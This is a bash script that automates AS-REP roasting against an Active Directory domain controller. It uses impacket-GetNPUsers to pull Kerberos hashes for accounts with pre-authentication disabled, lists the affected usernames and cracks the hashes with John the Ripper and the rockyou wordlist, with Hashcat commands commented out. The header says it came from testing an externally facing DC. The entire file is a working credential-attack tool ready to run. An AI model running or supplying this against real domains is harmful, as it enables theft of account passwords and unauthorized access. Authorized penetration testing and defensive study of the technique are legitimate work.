# A bash script to automate brute forcing AS-REP accounts from domain controllers.
# Created after testing a network where the DC was external facing and we could brute force AS-REP roastable accounts pre-auth.
# In our use case the usernames were collected via other means of enumeration, but this could be done blindly too. The script was not tested against a large username list.
# Gather the users you want to add to your users file and you are ready to begin.
# Developed using Impacket Version 0.11.0, may need to alter line 35/36 if using a different Impacket Version.
# Usage: ./asrep-roaster.sh <domain> <dc> <usersfile>
# Example: ./asrep-roaster.sh megacorp.local 10.10.10.10 /usr/share/wordlists/users.txt /home/adversary/target/asrep-roaster.txt

# Let's define the variables

domain=$1
dc=$2
usersfile=$3

# If the user does not use correct syntax, print the usage and exit.

if [ -z "$domain" ] || [ -z "$dc" ] || [ -z "$usersfile" ]; then
    echo "Please review usage guide and try again."
    echo "Usage: ./asrep-roaster.sh <domain> <dc> <usersfile>"
    echo "Example: ./asrep-roaster.sh example.com 10.10.10.1 /usr/share/wordlists/users.txt" 
    echo "Exiting..."
    exit 1
fi

# First, let's run impacket-GetNPUsers to enumerate users that have Kerberos pre-authentication disabled.

echo ""
echo "Enumerating users with Kerberos pre-authentication disabled..."
echo "----------------------------------------"
echo "Thank you, Impacket!"
echo ""

# We will save the output to a file called hashes.asrep. The format option can be changed to hashcat if that is the preferred cracking tool.

impacket-GetNPUsers $domain/ -dc-ip $dc -usersfile $usersfile -format john -outputfile hashes.asrep
# impacket-GetNPUsers $domain/ -dc-ip $dc -usersfile $usersfile -format hashcat -outputfile hashes.asrep

# This prints output to the terminal to see any usernames not requiring Kerberos pre-auth.

echo ""
echo ""
echo "AS-REP hashes were obtained for the following usernames:"
echo "----------------------------------------"


cat hashes.asrep | cut -d'$' -f3 | cut -d'@' -f1
# cat hashes.asrep | cut -d'$' -f4 | cut -d'@' -f1
echo ""

# Finally, let's crack some hashes. The script is currently configured for John but can be altered for Hashcat if lines 35/36, 46/47, and 57/58 trade being uncommented.

echo ""
echo "Attempting to crack the hashes..."
echo "----------------------------------------"
echo ""

john hashes.asrep --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
# hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force

echo ""
echo "----------------------------------------"
echo "Done cracking."
